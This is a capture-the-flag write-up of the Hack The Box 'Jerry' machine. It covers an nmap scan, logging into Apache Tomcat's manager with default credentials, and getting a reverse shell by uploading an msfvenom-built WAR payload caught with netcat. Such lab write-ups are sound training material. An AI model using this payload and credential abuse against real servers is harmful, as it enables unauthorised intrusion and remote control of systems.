# Jerry Easy Windows Machine

![image](https://github.com/user-attachments/assets/b2288312-2437-45af-909d-b69080e03cde)

## Machine Description

Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials. 

## Vulnerability Found

1. Using default credentials on Apache Tomcat HTTP server
2. Reverse shell via .WAR file upload 

## Step to Re-produce

### Enumeration

### Network Enumeration

I used `nmap` to perform network enumeration.

Payload:

    nmap 10.10.10.95 -p- -sV -sC -T5 -O -oN nmap1.txt

<div align="center">
  <img src="https://github.com/user-attachments/assets/fbd80588-982b-4a86-959a-ea78b8c3b142">
</div>

<div align="center">
  Nmap Output
</div>
</br>

From the nmap output, I found that this network run only one service. HTTP-Proxy was open in port 8080. I looked into it and found the Apache Tomcat default page.

### Web Enumeration

Upon finding the Apache Tomcat default page, I tried to get in into the manager app, but it asked me to input the credentials and I clicked on cancel. Turns out, the Apache Tomcat respond with a page saying I am not authorized. In response this page, Apache Tomcat also gave me a credentials, which is user `tomcat` password `s3cret`. You can see the picture below.

 <div align="center">
  <img src="https://github.com/user-attachments/assets/ec1f2089-b5f4-4595-8d08-499fb739ba68">
</div>

<div align="center">
  Tomcat credentials
</div>
</br>

Upon finding the credential, I tried to login into the manager app again and using the credential. By looking into the manager app further, I found that I can upload a .WAR file

 <div align="center">
  <img src="https://github.com/user-attachments/assets/663a7c5a-a22e-4723-b1f4-ff29da02ee3e">
</div>

<div align="center">
  Manager app
</div>
</br>

### Exploitation

I found this method to exploit Apache Tomcat by uploading .WAR file from (HackTricks Tomcat)[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#rce]. By following the **MSFVenom Reverse Shell**, I successfully exploiting the Apache server. Here is the step:

1. Create a .WAR file containing java/jsp_reverse_shell_tcp. Payload:

       msfvenom -p java/jsp_shell_reverse_tcp LHOST=Your-IP LPORT=Your-Port -f war -o revshell.war
  
2. Upload it into the Apache Tomcat via the **WAR file to deploy** section.
3. In the Application section, it should be shown and started.
4. Run a netcat listener on the port you set before.
5. Clicked on the file name to run the file.
6. Success obtain reverse shell

<div align="center">
  <img src="https://github.com/user-attachments/assets/171ae69b-ce86-4b25-af6b-5c1c333d460e">
</div>

<div align="center">
  Obtaining reverse shell
</div>
</br>

Next, I found an interesting file in `C:\Users\Administrator\Desktop\flags`. After I opened it, it showed me the both user.txt and root.txt

<div align="center">
  <img src="https://github.com/user-attachments/assets/3293c5b6-e227-4dc6-82cb-c6076c3de4f8">
</div>

<div align="center">
  user.txt and root.txt
</div>
</br>
